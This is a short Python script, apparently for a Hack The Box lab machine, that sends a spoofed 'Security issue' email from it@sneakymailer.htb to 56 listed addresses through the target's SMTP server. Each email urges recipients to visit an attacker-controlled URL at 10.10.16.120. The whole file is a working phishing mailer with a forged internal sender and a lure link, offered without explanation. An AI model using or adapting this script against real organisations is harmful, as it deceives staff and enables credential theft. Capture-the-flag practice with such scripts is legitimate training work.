import smtplib 
 

addresslist = ['airisatou@sneakymailer.htb','angelicaramos@sneakymailer.htb','ashtoncox@sneakymailer.htb','bradleygreer@sneakymailer.htb','brendenwagner@sneakymailer.htb',
'briellewilliamson@sneakymailer.htb','brunonash@sneakymailer.htb','caesarvance@sneakymailer.htb','carastevens@sneakymailer.htb', 
'cedrickelly@sneakymailer.htb','chardemarshall@sneakymailer.htb','colleenhurst@sneakymailer.htb','dairios@sneakymailer.htb','donnasnider@sneakymailer.htb',
'doriswilder@sneakymailer.htb','finncamacho@sneakymailer.htb','fionagreen@sneakymailer.htb','garrettwinters@sneakymailer.htb','gavincortez@sneakymailer.htb', 
'gavinjoyce@sneakymailer.htb', 'glorialittle@sneakymailer.htb', 'haleykennedy@sneakymailer.htb','hermionebutler@sneakymailer.htb','herrodchandler@sneakymailer.htb', 
'hopefuentes@sneakymailer.htb', 'howardhatfield@sneakymailer.htb', 'jacksonbradshaw@sneakymailer.htb','jenagaines@sneakymailer.htb','jenettecaldwell@sneakymailer.htb',
'jenniferacosta@sneakymailer.htb', 'jenniferchang@sneakymailer.htb', 'jonasalexander@sneakymailer.htb','laelgreer@sneakymailer.htb','martenamccray@sneakymailer.htb',
'michaelsilva@sneakymailer.htb', 'michellehouse@sneakymailer.htb', 'olivialiang@sneakymailer.htb','paulbyrd@sneakymailer.htb','prescottbartlett@sneakymailer.htb', 
'quinnflynn@sneakymailer.htb', 'rhonadavidson@sneakymailer.htb', 'sakurayamamoto@sneakymailer.htb', 'sergebaldwin@sneakymailer.htb','shaddecker@sneakymailer.htb', 
'shouitou@sneakymailer.htb', 'sonyafrost@sneakymailer.htb', 'sukiburks@sneakymailer.htb','sulcud@sneakymailer.htb', 'tatyanafitzpatrick@sneakymailer.htb', 
'thorwalton@sneakymailer.htb', 'tigernixon@sneakymailer.htb', 'timothymooney@sneakymailer.htb', 'unitybutler@sneakymailer.htb', 'vivianharrell@sneakymailer.htb',
'yuriberry@sneakymailer.htb','zenaidafrank@sneakymailer.htb'] 
 
fromaddr = 'it@sneakymailer.htb' 
 
for address in addresslist: 
    toaddrs  = address 
    TEXT = 'we have a security issue please visit http://10.10.16.120' 
    SUBJECT = 'Security issue' 
    msg = 'Subject: %s\n\n%s' % (SUBJECT, TEXT) 
 
    server = smtplib.SMTP('10.10.10.197',25) 
    server.starttls() 
    server.sendmail(fromaddr, toaddrs, msg) 
    server.quit() 
